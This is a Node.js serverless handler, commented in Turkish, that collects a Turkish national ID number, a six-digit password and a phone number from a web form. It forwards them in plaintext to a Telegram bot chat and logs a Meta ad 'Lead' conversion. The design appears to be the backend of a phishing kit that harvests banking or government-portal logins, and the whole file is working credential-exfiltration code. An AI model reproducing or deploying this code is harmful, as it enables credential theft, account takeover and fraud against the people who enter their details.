import axios from 'axios';
import dotenv from 'dotenv';
import crypto from 'crypto'; // Node.js built-in, SHA-256 için

dotenv.config();

export default async function handler(req, res) {
  // CORS: Vercel'de frontend domain'ini ekle (örn. https://your-frontend.vercel.app)
  res.setHeader('Access-Control-Allow-Origin', '*'); // Test için; production'da spesifik domain
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  // OPTIONS preflight için
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Yalnızca POST istekleri desteklenir.' });
  }
  try {
    // Next.js built-in body parsing (req.body direkt JSON)
    const { tc, password, phone, eventID } = req.body || {};
   
    // Validation
    if (!tc || tc.length !== 11 || !/^\d+$/.test(tc)) {
      return res.status(400).json({ message: 'Geçersiz TC numarası.' });
    }
    if (!password || password.length !== 6 || !/^\d+$/.test(password)) {
      return res.status(400).json({ message: 'Geçersiz şifre.' });
    }
    if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
      return res.status(400).json({ message: 'Geçersiz telefon numarası.' });
    }
    if (!eventID) {
      return res.status(400).json({ message: 'Event ID eksik.' });
    }
    
    const message = `TC: ${tc}\nŞifre: ${password}\nTelefon Numarası: ${phone}`;
    console.log('Gönderilen veri:', { 
      tc: tc.substring(0, 4) + '****' + tc.substring(8), 
      password: '******', 
      phone: phone.substring(0, 3) + '****' + phone.substring(7),
      eventID: eventID.substring(0, 8) + '...'
    });
    
    // Env check (Vercel'de set edilmiş olmalı)
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      console.error('Telegram env eksik!');
      return res.status(500).json({ message: 'Sunucu config hatası.' });
    }
    const response = await axios.post(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
      },
      { timeout: 10000 } // 10s timeout, Vercel için
    );
   
    console.log('Telegram yanıtı:', response.data);
   
    if (response.data.ok) {
      // Telegram başarılıysa, Conversions API'ye server-side Lead event'i gönder
      try {
        const normalizedPhone = `+90${phone}`; // Telefonu normalize et

        // SHA-256 hash fonksiyonu (Node.js crypto ile)
        const hashData = (data) => {
          return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
        };

        const hashedPhone = hashData(normalizedPhone);
        const hashedTc = hashData(tc);

        // Dinamik URL: Mevcut host'tan al (Vercel uyumlu)
        const currentHost = req.headers['x-forwarded-host'] || req.headers['host'] || 'fallback-domain.com';
        const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
        const dynamicUrl = `${protocol}://${currentHost}/telefon`;

        // Conversions API payload - Lead olayı için
        const payload = {
          data: [
            {
              event_name: 'Lead',
              event_time: Math.floor(Date.now() / 1000), // Unix timestamp
              action_source: 'website',
              event_source_url: dynamicUrl,
              event_id: eventID, // Frontend'den gelen eventID kullan (deduplication için)
              user_data: {
                ph: [hashedPhone],
                external_id: [hashedTc],
                client_ip_address: (req.headers['x-forwarded-for'] || '').split(',')[0]?.trim() || req.socket.remoteAddress || '',
                client_user_agent: req.headers['user-agent'] || 'unknown'
              },
              custom_data: {
                content_category: 'lead_form',
                content_name: 'phone_verification'
              }
            }
          ]
        };

        // Env'den Meta token ve Pixel ID'yi al
        const metaToken = process.env.META_CONVERSIONS_TOKEN;
        const pixelId = process.env.META_PIXEL_ID || '1319126396318999'; // Yeni Pixel ID

        if (!metaToken || !pixelId) {
          console.error('Meta Conversions token veya Pixel ID eksik! Env: META_CONVERSIONS_TOKEN ve META_PIXEL_ID');
        } else {
          const metaResponse = await axios.post(
            `https://graph.facebook.com/v20.0/${pixelId}/events?access_token=${metaToken}`,
            payload,
            { timeout: 10000 }
          );
          console.log('Conversions API yanıtı:', metaResponse.data);
          if (metaResponse.data.events_received) {
            console.log(`Başarılı: ${metaResponse.data.events_received} event gönderildi. Event ID: ${eventID.substring(0, 8)}...`);
          } else {
            console.error('Conversions API hatası:', metaResponse.data);
          }
        }
      } catch (metaError) {
        console.error('Conversions API hatası:', metaError.message);
        // Telegram başarılı olduğu için devam et
      }

      return res.status(200).json({ message: 'Bilgiler gönderildi.' });
    } else {
      console.error('TG API hatası:', response.data);
      return res.status(500).json({ message: 'Telegram gönderimi başarısız.', details: response.data.description });
    }
   
  } catch (error) {
    console.error('Handler hatası:', error.message, error.response?.data);
    return res.status(500).json({ message: 'Hata oluştu.', details: error.message });
  }
}
